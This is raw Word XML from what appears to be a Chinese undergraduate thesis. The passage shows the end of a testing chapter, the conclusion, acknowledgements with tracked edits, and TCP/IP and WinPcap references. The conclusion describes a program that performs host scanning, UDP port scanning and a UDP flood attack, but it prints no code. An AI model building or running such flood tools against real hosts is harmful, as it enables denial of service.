      <w:bookmarkEnd w:id="1185"/>
      <w:bookmarkEnd w:id="1186"/>
      <w:bookmarkEnd w:id="1187"/>
    </w:p>
    <w:p w14:paraId="42682542" w14:textId="2A597BA9" w:rsidR="00E53C82" w:rsidRPr="0034487A" w:rsidRDefault="00E53C82" w:rsidP="005C3982">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1188" w:name="_Hlt273362777"/>
      <w:bookmarkEnd w:id="1188"/>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>本章是对应用程序的测试。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="100037D7" w14:textId="55F0A803" w:rsidR="00150B71" w:rsidRPr="0034487A" w:rsidRDefault="00E53C82" w:rsidP="005C3982">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>在测试的过程中，需要完整地测试程序功能，选择丰富的测试用例。同时当展示测试情况时，需要突出重点，简介明了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68F7D069" w14:textId="22084812" w:rsidR="00E53C82" w:rsidRPr="0034487A" w:rsidRDefault="00E53C82" w:rsidP="00E53C82">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>通过以上测试可以看出，该程序逻辑清楚，流程清晰，功能得到了很好的实现。很好的完成了主机扫描，UDP端口扫描，UDP</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t xml:space="preserve"> F</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>lood攻击。当然，程序可能还存在一些没有测试到位的地方，有待发现和完善。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67D4AB86" w14:textId="4313133E" w:rsidR="00150B71" w:rsidRPr="00E90326" w:rsidRDefault="00150B71" w:rsidP="00F726F9">
      <w:pPr>
        <w:pStyle w:val="10505"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="432"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:jc w:val="both"/>
        <w:sectPr w:rsidR="00150B71" w:rsidRPr="00E90326">
          <w:headerReference w:type="default" r:id="rId50"/>
          <w:pgSz w:w="11906" w:h="16838"/>
          <w:pgMar w:top="1440" w:right="1797" w:bottom="1440" w:left="1797" w:header="851" w:footer="992" w:gutter="0"/>
          <w:cols w:space="720"/>
          <w:docGrid w:linePitch="312"/>
        </w:sectPr>
      </w:pPr>
      <w:bookmarkStart w:id="1189" w:name="_Hlt273261560"/>
      <w:bookmarkEnd w:id="1189"/>
    </w:p>
    <w:p w14:paraId="64C51203" w14:textId="14C74E1F" w:rsidR="00150B71" w:rsidRPr="00E90326" w:rsidRDefault="00150B71" w:rsidP="00B063B8">
      <w:pPr>
        <w:pStyle w:val="10505"/>
        <w:pageBreakBefore/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="432"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120" w:line="480" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
          <w:b/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1190" w:name="_Toc482141276"/>
      <w:bookmarkStart w:id="1191" w:name="_Toc482141949"/>
      <w:bookmarkStart w:id="1192" w:name="_Toc482522672"/>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>结论</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1190"/>
      <w:bookmarkEnd w:id="1191"/>
      <w:bookmarkEnd w:id="1192"/>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6A962D98" w14:textId="2DF1A3C2" w:rsidR="00150B71" w:rsidRPr="00E90326" w:rsidRDefault="00832959" w:rsidP="00991595">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLineChars="250" w:firstLine="600"/>
        <w:sectPr w:rsidR="00150B71" w:rsidRPr="00E90326">
          <w:headerReference w:type="default" r:id="rId51"/>
          <w:pgSz w:w="11906" w:h="16838"/>
          <w:pgMar w:top="1440" w:right="1797" w:bottom="1440" w:left="1797" w:header="851" w:footer="992" w:gutter="0"/>
          <w:cols w:space="720"/>
          <w:docGrid w:linePitch="312"/>
        </w:sectPr>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攻击的一系列工作。整个系统功能完整，逻辑简单易懂。能有效地实现扫描和攻击。可以作为单独的应用程序使用，也可以将个模块独立出来作为使用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B9B3C14" w14:textId="77777777" w:rsidR="006D52D6" w:rsidRPr="00E90326" w:rsidRDefault="006D52D6" w:rsidP="006D52D6">
      <w:pPr>
        <w:pStyle w:val="10505"/>
        <w:pageBreakBefore/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="432"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120" w:line="480" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="1193" w:author="renxt" w:date="2017-05-13T21:04:00Z"/>
          <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
          <w:b/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1194" w:name="_Toc482522673"/>
      <w:bookmarkStart w:id="1195" w:name="_Toc482141277"/>
      <w:bookmarkStart w:id="1196" w:name="_Toc482141950"/>
      <w:ins w:id="1197" w:author="renxt" w:date="2017-05-13T21:04:00Z">
        <w:r w:rsidRPr="00E90326">
          <w:rPr>
            <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
            <w:b/>
            <w:szCs w:val="36"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t>致谢</w:t>
        </w:r>
        <w:bookmarkEnd w:id="1194"/>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1D5CA63B" w14:textId="77777777" w:rsidR="006D52D6" w:rsidRDefault="006D52D6" w:rsidP="006D52D6">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLineChars="250" w:firstLine="600"/>
        <w:rPr>
          <w:ins w:id="1198" w:author="renxt" w:date="2017-05-13T21:04:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1199" w:author="renxt" w:date="2017-05-13T21:04:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>毕业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ins>
    </w:p>
    <w:p w14:paraId="0661EC8B" w14:textId="77777777" w:rsidR="006D52D6" w:rsidRDefault="006D52D6" w:rsidP="006D52D6">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLineChars="250" w:firstLine="600"/>
        <w:rPr>
          <w:ins w:id="1200" w:author="renxt" w:date="2017-05-13T21:04:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1201" w:author="renxt" w:date="2017-05-13T21:04:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>在这期间，十分感谢我的指导老师任兴田老师，他给予了我很大的帮助。他给我们推荐参考书和相关资料、指导我们解决问题、在有困难的时候为我们开阔思维，始终支持我们。</w:t>
        </w:r>
        <w:del w:id="1202" w:author="李勇" w:date="2017-05-13T21:52:00Z">
          <w:r w:rsidDel="00764EDA">
            <w:rPr>
              <w:rFonts w:hint="eastAsia"/>
            </w:rPr>
            <w:delText>，</w:delText>
          </w:r>
        </w:del>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>有了他的辛勤付出和指导，才使得这篇论文得以成功完成。</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="75BC526E" w14:textId="77777777" w:rsidR="006D52D6" w:rsidRPr="00775F04" w:rsidRDefault="006D52D6" w:rsidP="006D52D6">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLineChars="250" w:firstLine="600"/>
        <w:rPr>
          <w:ins w:id="1203" w:author="renxt" w:date="2017-05-13T21:04:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1204" w:author="renxt" w:date="2017-05-13T21:04:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>在这四年的时光了，有很多帮助过我的老师和同学，是你们让我大学的生活变得更加美好，让我有了成长。</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1E600347" w14:textId="06EC5F62" w:rsidR="00150B71" w:rsidRPr="00E90326" w:rsidRDefault="00150B71" w:rsidP="00B063B8">
      <w:pPr>
        <w:pStyle w:val="10505"/>
        <w:pageBreakBefore/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="432"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120" w:line="480" w:lineRule="auto"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1205" w:name="_Toc482522674"/>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>参考文献</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1195"/>
      <w:bookmarkEnd w:id="1196"/>
      <w:bookmarkEnd w:id="1205"/>
    </w:p>
    <w:p w14:paraId="30579F10" w14:textId="2DEEBAE1" w:rsidR="0004563A" w:rsidRPr="009C29FF" w:rsidRDefault="00AB2F0A" w:rsidP="00AB2F0A">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t xml:space="preserve">[1] </w:t>
      </w:r>
      <w:r w:rsidR="0004563A" w:rsidRPr="009C29FF">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>DOUGLAS E.COMER</w:t>
      </w:r>
      <w:r w:rsidR="0004563A" w:rsidRPr="009C29FF">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>著，</w:t>
      </w:r>
      <w:r w:rsidR="0004563A" w:rsidRPr="009C29FF">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>林瑶</w:t>
      </w:r>
      <w:r w:rsidR="0004563A" w:rsidRPr="009C29FF">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidR="0004563A" w:rsidRPr="009C29FF">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>张娟</w:t>
      </w:r>
      <w:r w:rsidR="0004563A" w:rsidRPr="009C29FF">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidR="0004563A" w:rsidRPr="009C29FF">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>王海</w:t>
      </w:r>
      <w:r w:rsidR="0004563A" w:rsidRPr="009C29FF">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>等译. 用TCP/IP进行网际互连 第1卷：原理、协议与结构(第五版). 电子工业出版社</w:t>
      </w:r>
      <w:r w:rsidR="00336539">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="0004563A" w:rsidRPr="009C29FF">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="0004563A" w:rsidRPr="009C29FF">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve">2007 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FF002EC" w14:textId="7BE7E157" w:rsidR="00F434F7" w:rsidRPr="009C29FF" w:rsidRDefault="0004563A" w:rsidP="00AB2F0A">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009C29FF">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>[2]</w:t>
      </w:r>
      <w:r w:rsidR="00AB2F0A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="009C29FF">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>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52" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="009C29FF">
          <w:rPr>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          </w:rPr>
          <w:t>TCP/IP详解 卷1：协议</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="009C29FF">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>. 机械工业出版社、中信出版社</w:t>
      </w:r>
      <w:r w:rsidR="00336539">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidRPr="009C29FF">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2000</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="780ABFEA" w14:textId="7E690CF6" w:rsidR="0004563A" w:rsidRPr="009C29FF" w:rsidRDefault="0004563A" w:rsidP="00AB2F0A">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009C29FF">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>[3]</w:t>
      </w:r>
      <w:r w:rsidR="00AB2F0A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="005C2FDB">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>WinP</w:t>
      </w:r>
      <w:r w:rsidRPr="009C29FF">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>cap. http://www.winpcap.org</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F717E7A" w14:textId="08B5A6A7" w:rsidR="0004563A" w:rsidRPr="009C29FF" w:rsidRDefault="0004563A" w:rsidP="00AB2F0A">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009C29FF">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>[4]</w:t>
      </w:r>
      <w:r w:rsidR="00AB2F0A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t xml:space="preserve"> </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清华大学出版社</w:t>
      </w:r>
      <w:r w:rsidR="00B519DA">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidRPr="009C29FF">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="009C29FF">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>2011</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B8D60F9" w14:textId="74741B73" w:rsidR="0004563A" w:rsidRDefault="0004563A" w:rsidP="00AB2F0A">
      <w:pPr>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00AB2F0A">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve"> </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00336539">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>,</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062D9E63" w14:textId="272B55AF" w:rsidR="00150B71" w:rsidRPr="00777C1E" w:rsidRDefault="00F434F7" w:rsidP="00777C1E">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Pr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
      <w:r w:rsidR="00AB2F0A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00397207">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>Ivor horton著</w:t>
      </w:r>
      <w:r w:rsidR="00B519DA">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>,</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00B519DA">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>2010</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35D81025" w14:textId="6F21AF42" w:rsidR="00150B71" w:rsidRPr="00E90326" w:rsidDel="006D52D6" w:rsidRDefault="00150B71" w:rsidP="00777C1E">
      <w:pPr>
        <w:pStyle w:val="10505"/>
        <w:pageBreakBefore/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="432"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120" w:line="480" w:lineRule="auto"/>
        <w:rPr>
          <w:del w:id="1206" w:author="renxt" w:date="2017-05-13T21:04:00Z"/>
          <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
          <w:b/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1207" w:name="_Toc482141278"/>
      <w:bookmarkStart w:id="1208" w:name="_Toc482141951"/>
      <w:del w:id="1209" w:author="renxt" w:date="2017-05-13T21:04:00Z">
        <w:r w:rsidRPr="00E90326" w:rsidDel="006D52D6">
          <w:rPr>
            <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
            <w:b/>
            <w:szCs w:val="36"/>
          </w:rPr>
          <w:delText>致谢</w:delText>
        </w:r>
        <w:bookmarkEnd w:id="1207"/>
        <w:bookmarkEnd w:id="1208"/>
      </w:del>
    </w:p>
    <w:p w14:paraId="0B0A56C3" w14:textId="7DA19085" w:rsidR="00B24149" w:rsidDel="006D52D6" w:rsidRDefault="0004563A" w:rsidP="00593AC4">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLineChars="250" w:firstLine="600"/>
        <w:rPr>
          <w:del w:id="1210" w:author="renxt" w:date="2017-05-13T21:04:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1211" w:author="renxt" w:date="2017-05-13T21:04:00Z">
        <w:r w:rsidDel="006D52D6">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>毕业</w:delText>
        </w:r>
        <w:r w:rsidR="00B24149" w:rsidDel="006D52D6">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delTex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delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="64CAF9C0" w14:textId="330E57A7" w:rsidR="00B24149" w:rsidDel="006D52D6" w:rsidRDefault="00B24149" w:rsidP="00593AC4">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLineChars="250" w:firstLine="600"/>
        <w:rPr>
          <w:del w:id="1212" w:author="renxt" w:date="2017-05-13T21:04:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1213" w:author="renxt" w:date="2017-05-13T21:04:00Z">
        <w:r w:rsidDel="006D52D6">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delTex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delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="7A2434F8" w14:textId="4845730A" w:rsidR="009B4B35" w:rsidRPr="00775F04" w:rsidRDefault="00B24149" w:rsidP="00775F04">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLineChars="250" w:firstLine="600"/>
      </w:pPr>
      <w:del w:id="1214" w:author="renxt" w:date="2017-05-13T21:04:00Z">
        <w:r w:rsidDel="006D52D6">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>在这四年的时光了，有很多帮助过我的老师和同学，是你们让我大学的生活变得更加美好，让我有了成长。</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:sectPr w:rsidR="009B4B35" w:rsidRPr="00775F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038B9" w14:textId="77777777" w:rsidR="00554707" w:rsidRDefault="00554707" w:rsidP="00AD34D2">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="40670014" w14:textId="77777777" w:rsidR="00554707" w:rsidRDefault="00554707"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554707" w:rsidRDefault="00554707">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554707" w:rsidRDefault="00554707">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514F439E" w:rsidR="00554707" w:rsidRDefault="00554707">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CD1E69">
      <w:rPr>
        <w:noProof/>
        <w:kern w:val="0"/>
        <w:szCs w:val="21"/>
      </w:rPr>
      <w:t>15</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554707" w:rsidRDefault="00554707">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554707" w:rsidRDefault="00554707">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554707" w:rsidRDefault="00554707">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554707" w:rsidRDefault="00554707">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01BA8B2F" w:rsidR="00554707" w:rsidRDefault="00554707">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CD1E69">
      <w:rPr>
        <w:noProof/>
        <w:kern w:val="0"/>
        <w:szCs w:val="21"/>
      </w:rPr>
      <w:t>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554707" w:rsidRDefault="00554707">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554707" w:rsidRDefault="00554707">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06958AA6" w:rsidR="00554707" w:rsidRDefault="00554707">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CD1E69">
      <w:rPr>
        <w:noProof/>
        <w:kern w:val="0"/>
        <w:szCs w:val="21"/>
      </w:rPr>
      <w:t>III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554707" w:rsidRDefault="00554707">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03193" w14:textId="77777777" w:rsidR="00554707" w:rsidRDefault="00554707" w:rsidP="00AD34D2">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="094E2BFE" w14:textId="77777777" w:rsidR="00554707" w:rsidRDefault="00554707"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554707" w:rsidRDefault="00554707">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554707" w:rsidRDefault="00554707">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554707" w:rsidRDefault="00554707">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554707" w:rsidRDefault="00554707">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554707" w:rsidRDefault="00554707">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554707" w:rsidRDefault="00554707">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554707" w:rsidRDefault="00554707">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554707" w:rsidRDefault="00554707">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554707" w:rsidRDefault="00554707">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554707" w:rsidRPr="00E552C5" w:rsidRDefault="00554707">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554707" w:rsidRDefault="00554707">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554707" w:rsidRDefault="00554707">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554707" w:rsidRDefault="00554707">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554707" w:rsidRDefault="00554707">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995"/>
        </w:tabs>
        <w:ind w:left="1995"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3C25D7"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="7FB6F0D0"/>
    <w:lvl w:ilvl="0" w:tplc="CE1208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ng li">
    <w15:presenceInfo w15:providerId="Windows Live" w15:userId="78965178252323d8"/>
  </w15:person>
  <w15:person w15:author="李勇">
    <w15:presenceInfo w15:providerId="None" w15:userId="李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0322D"/>
    <w:rsid w:val="00003627"/>
    <w:rsid w:val="00005A6E"/>
    <w:rsid w:val="000103E4"/>
    <w:rsid w:val="000238C0"/>
    <w:rsid w:val="00024430"/>
    <w:rsid w:val="00025B07"/>
    <w:rsid w:val="00026882"/>
    <w:rsid w:val="00030EC6"/>
    <w:rsid w:val="0003318E"/>
    <w:rsid w:val="00037CA4"/>
    <w:rsid w:val="00044632"/>
    <w:rsid w:val="0004563A"/>
    <w:rsid w:val="00051E41"/>
    <w:rsid w:val="00057122"/>
    <w:rsid w:val="00060DE1"/>
    <w:rsid w:val="00062408"/>
    <w:rsid w:val="00062F96"/>
    <w:rsid w:val="000656A3"/>
    <w:rsid w:val="00075860"/>
    <w:rsid w:val="000758FF"/>
    <w:rsid w:val="00083B06"/>
    <w:rsid w:val="00083E48"/>
    <w:rsid w:val="0009289A"/>
    <w:rsid w:val="00093838"/>
    <w:rsid w:val="000977B6"/>
    <w:rsid w:val="000A769B"/>
    <w:rsid w:val="000B1DEA"/>
    <w:rsid w:val="000B3F4C"/>
    <w:rsid w:val="000B483A"/>
    <w:rsid w:val="000B53A8"/>
    <w:rsid w:val="000B7B69"/>
    <w:rsid w:val="000C48B8"/>
    <w:rsid w:val="000D3979"/>
    <w:rsid w:val="000D3F24"/>
    <w:rsid w:val="000E3DF4"/>
    <w:rsid w:val="000E461C"/>
    <w:rsid w:val="000E6B5C"/>
    <w:rsid w:val="000F0A9F"/>
    <w:rsid w:val="000F0F92"/>
    <w:rsid w:val="000F5F92"/>
    <w:rsid w:val="00105D33"/>
    <w:rsid w:val="00106FEC"/>
    <w:rsid w:val="001122C8"/>
    <w:rsid w:val="001147C1"/>
    <w:rsid w:val="001236F7"/>
    <w:rsid w:val="001257A1"/>
    <w:rsid w:val="001259A1"/>
    <w:rsid w:val="001259C2"/>
    <w:rsid w:val="00132EC3"/>
